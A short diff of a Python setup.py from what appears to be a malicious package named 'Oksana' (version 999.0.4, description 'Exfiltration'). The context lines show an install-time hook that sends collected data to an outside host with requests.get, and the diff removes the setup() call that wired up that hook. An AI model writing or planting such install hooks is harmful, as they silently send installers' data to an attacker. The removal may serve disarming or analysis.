@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("http://grmmrly.j0j0.xyz",params = ploads)
 
 
-setup(name='Oksana',
-      version='999.0.4',
-      description='Exfiltration',
-      author='j0j0',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                      
